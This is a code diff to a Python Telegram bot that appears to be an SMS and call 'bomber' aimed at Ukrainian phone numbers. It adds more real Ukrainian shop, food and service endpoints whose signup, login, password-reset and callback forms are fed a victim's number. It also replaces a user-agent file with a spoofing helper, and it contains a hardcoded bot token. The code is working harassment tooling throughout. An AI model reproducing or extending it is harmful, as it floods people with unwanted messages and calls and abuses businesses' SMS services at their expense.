@@ -8,6 +8,7 @@ import random
 from random import choice
 import parser_https
 import sms_bomber_keyboard as kb
+from users_agent_list import get_agent
 
 TOKEN = '5629678144:AAGcADad3E4a-ry7JagBKFBripJWrxCXmL8'
 
@@ -81,10 +82,8 @@ def start(message):
     save_chat_id(message.chat.id)
 
 def send_for_number_sms(aa):
-    with open('fake_user_agents.txt', 'rb') as f:
-        ua = f.read().split()
     headers = {
-        'User-Agent': choice(ua)
+        'User-Agent': get_agent()
     }
 
     messages = ['Перезвоніть мені будь ласка', 'хочу поговорити за сам сайт','хочу проконсультоватись','чекаю вашого звінку']
@@ -188,7 +187,7 @@ def send_for_number_sms(aa):
         time.sleep(0.4)
         sms = requests.post(f'https://my.hmara.tv/api/sign?contact={aa}',headers=headers) 
         time.sleep(0.4)
-        sms = requests.post('https://api.sweet.tv/SignupService/SetPhone.json',headers=headers,json={"device": {"type": "DT_Web_Browser","application": {"type": "AT_SWEET_TV_Player"},"model": ua.random,"firmware": {"versionCode": 1,"versionString": "3.2.28"},"uuid": "3408e209-12b7-4102-bb92-b327151bff9f","supported_drm": {"widevine_modular": True}},"phone": aa}) 
+        sms = requests.post('https://api.sweet.tv/SignupService/SetPhone.json',headers=headers,json={"device": {"type": "DT_Web_Browser","application": {"type": "AT_SWEET_TV_Player"},"model": get_agent(),"firmware": {"versionCode": 1,"versionString": "3.2.28"},"uuid": "3408e209-12b7-4102-bb92-b327151bff9f","supported_drm": {"widevine_modular": True}},"phone": aa}) 
         time.sleep(0.4)
         sms = requests.post('https://www.pratik.com.ua/uk/?gclid=CjwKCAjw1ICZBhAzEiwAFfvFhIWCEV44RWKP16RvSC3Cj8E-ntL6NkYlW2V9kAyBugHoTLRziRZzrhoC_sUQAvD_BwE',headers=headers,data={'phone': f'+{aa[:2]} {aa[2:5]} {aa[5:8]} {aa[8:10]} {aa[10:12]}','action_form': 'get_auth_sms'})    
         time.sleep(0.4)
@@ -220,15 +219,22 @@ def send_for_number_sms(aa):
         time.sleep(0.4)
         sms = requests.post('https://carta.ua/api/v1.0/register/user',headers=headers,json={"username": name,"phone": f'({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}',"plainPassword": {"first": password,"second": password},"confirmType": "phone"})
         time.sleep(0.4)
+        sms = requests.post('https://maslotom.com/api/index.php?route=api/account/phoneLogin',headers=headers,data={'phone': f'+{aa[:3]}({aa[3:5]}){aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
+        time.sleep(0.4)
+        sms = requests.post('https://prontopizza.ua/lviv/wp-admin/admin-ajax.php',headers=headers,data={'first_name': name,'last_name': surname,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','input_check_send_sms': '','email': email,'password': password,'password2': password,'agree': 'on','action': 'register_user'})
+        time.sleep(0.4)
+        sms = requests.post('https://api.sezamfood.com.ua/ru/request/auth-phone',headers=headers,json={"phone": aa,"agree": 1})
+        time.sleep(0.4)
+        sms = requests.post('https://www.garrys.com.ua/ajax/reguser/',headers=headers,data={'name': name,'login': f'{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}','password': password,'control': '1'})
+        time.sleep(0.4)
+        sms = requests.post('https://www.garrys.com.ua/ajax/remind_password/',headers=headers,data={'nphone': f'{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
     except:
         pass
     print('все')
 
 def send_for_number_call(aa):
-    with open('fake_user_agents.txt', 'rb') as f:
-        ua = f.read().split()
     headers = {
-        'User-Agent': choice(ua)
+        'User-Agent': get_agent()
     }
 
     messages = ['Перезвоніть мені будь ласка', 'хочу поговорити за сам сайт','хочу проконсультоватись','чекаю вашого звінку']
@@ -333,16 +339,20 @@ def send_for_number_call(aa):
         call = requests.post('https://webapi.sportlife.ua/landing-form-submissions',headers=headers,json={"utm_source": 'null',"utm_medium": 'null',"utm_campaign": 'null',"utm_term": 'null',"utm_content": 'null',"remote_addr": "178.92.20.29","club_id": "18","club_name": "Героїв УПА","city_id": "41","club_raw": "ЛВУ","comment_1": "Регистрации с конструктора абонементов (New site)","name": name,"patronymic": "","surname": "","birthday": "","phone": f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}',"email": "","address": "","club": "28","city": "2","acceptment": True})
         time.sleep(0.4)
         call = requests.post('http://kirbud.com.ua/index.php?route=extension/module/callback',headers=headers,data={'name': '','phone': number_plus,'comment': '','action': 'send'})
+        time.sleep(0.4)
+        call = requests.post('https://bcaa.ua/interactive/ajax.php?zone=site&action=callback',headers=headers,data={'firstname': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
+        time.sleep(0.4)
+        call = requests.post('https://protein-max.com.ua/ajaxrequest',headers=headers,data={'mguniqueurl': 'action/sendOrderRing','pluginHandler': 'back-ring','name': 'name','comment': '','phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}','city_id': '','mission': '','date_callback': '','time_callback': '','invisible': '1','status_id': '1','pub': '1','capcha': ''})
+        time.sleep(0.4)
+        call = requests.post('https://vitok.ua/ua/feedback/headerCallback/',headers=headers,data={'cellphone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','isAjaxForm': 'headerCallbackForm_W5DgT','isAjax': '1','unique_id': 'W5DgT'})
     except:
         pass
     print('все')
 
 
 def send_for_number_mix(aa):
-    with open('fake_user_agents.txt', 'rb') as f:
-        ua = f.read().split()
     headers = {
-        'User-Agent': choice(ua)
+        'User-Agent':get_agent()
     }
 
     messages = ['Перезвоніть мені будь ласка', 'хочу поговорити за сам сайт','хочу проконсультоватись','чекаю вашого звінку']
@@ -492,7 +502,7 @@ def send_for_number_mix(aa):
         time.sleep(0.4)
         d = requests.post(f'https://my.hmara.tv/api/sign?contact={aa}',headers=headers) 
         time.sleep(0.4)
-        d = requests.post('https://api.sweet.tv/SignupService/SetPhone.json',headers=headers,json={"device": {"type": "DT_Web_Browser","application": {"type": "AT_SWEET_TV_Player"},"model": ua.random,"firmware": {"versionCode": 1,"versionString": "3.2.28"},"uuid": "3408e209-12b7-4102-bb92-b327151bff9f","supported_drm": {"widevine_modular": True}},"phone": aa}) 
+        d = requests.post('https://api.sweet.tv/SignupService/SetPhone.json',headers=headers,json={"device": {"type": "DT_Web_Browser","application": {"type": "AT_SWEET_TV_Player"},"model": get_agent(),"firmware": {"versionCode": 1,"versionString": "3.2.28"},"uuid": "3408e209-12b7-4102-bb92-b327151bff9f","supported_drm": {"widevine_modular": True}},"phone": aa}) 
         time.sleep(0.4)
         d = requests.post('https://www.pratik.com.ua/uk/?gclid=CjwKCAjw1ICZBhAzEiwAFfvFhIWCEV44RWKP16RvSC3Cj8E-ntL6NkYlW2V9kAyBugHoTLRziRZzrhoC_sUQAvD_BwE',headers=headers,data={'phone': f'+{aa[:2]} {aa[2:5]} {aa[5:8]} {aa[8:10]} {aa[10:12]}','action_form': 'get_auth_sms'})    
         time.sleep(0.4)
@@ -557,6 +567,26 @@ def send_for_number_mix(aa):
         d = requests.post('https://webapi.sportlife.ua/landing-form-submissions',headers=headers,json={"utm_source": 'null',"utm_medium": 'null',"utm_campaign": 'null',"utm_term": 'null',"utm_content": 'null',"remote_addr": "178.92.20.29","club_id": "18","club_name": "Героїв УПА","city_id": "41","club_raw": "ЛВУ","comment_1": "Регистрации с конструктора абонементов (New site)","name": name,"patronymic": "","surname": "","birthday": "","phone": f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}',"email": "","address": "","club": "28","city": "2","acceptment": True})
         time.sleep(0.4)
         d = requests.post('http://kirbud.com.ua/index.php?route=extension/module/callback',headers=headers,data={'name': '','phone': number_plus,'comment': '','action': 'send'})
+        time.sleep(0.4)
+        d = requests.post('https://maslotom.com/api/index.php?route=api/account/phoneLogin',headers=headers,data={'phone': f'+{aa[:3]}({aa[3:5]}){aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
+        time.sleep(0.4)
+        d = requests.post('https://bcaa.ua/interactive/ajax.php?zone=site&action=callback',headers=headers,data={'firstname': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
+        time.sleep(0.4)
+        d = requests.post('https://protein-max.com.ua/ajaxrequest',headers=headers,data={'mguniqueurl': 'action/sendOrderRing','pluginHandler': 'back-ring','name': 'name','comment': '','phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}','city_id': '','mission': '','date_callback': '','time_callback': '','invisible': '1','status_id': '1','pub': '1','capcha': ''})
+        time.sleep(0.4)
+        d = requests.post('https://vitok.ua/ua/feedback/headerCallback/',headers=headers,data={'cellphone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','isAjaxForm': 'headerCallbackForm_W5DgT','isAjax': '1','unique_id': 'W5DgT'})
+        time.sleep(0.4)
+        d = requests.post('https://prontopizza.ua/lviv/wp-admin/admin-ajax.php',headers=headers,data={'first_name': name,'last_name': surname,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','input_check_send_sms': '','email': email,'password': password,'password2': password,'agree': 'on','action': 'register_user'})
+        time.sleep(0.4)
+        d = requests.post('https://pesto-family.com/index.php?route=information/contact/feedback',headers=headers,data={'route': 'information/contact/feedback','feedbackName': name,'feedbackPhone': f'{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','feedbackEmail': '','feedbackMsg': ''})
+        time.sleep(0.4)
+        d = requests.post('https://sushiya.ua/ru/api/v1/user/auth',headers=headers,data={'phone': f'{aa[2:5]}{aa[5:8]}{aa[8:10]}{aa[10:12]}','need_skeep': ''})
+        time.sleep(0.4)
+        d = requests.post('https://api.sezamfood.com.ua/ru/request/auth-phone',headers=headers,json={"phone": aa,"agree": 1})
+        time.sleep(0.4)
+        d = requests.post('https://www.garrys.com.ua/ajax/reguser/',headers=headers,data={'name': name,'login': f'{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}','password': password,'control': '1'})
+        time.sleep(0.4)
+        d = requests.post('https://www.garrys.com.ua/ajax/remind_password/',headers=headers,data={'nphone': f'{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
     except:
         pass
     print('все')
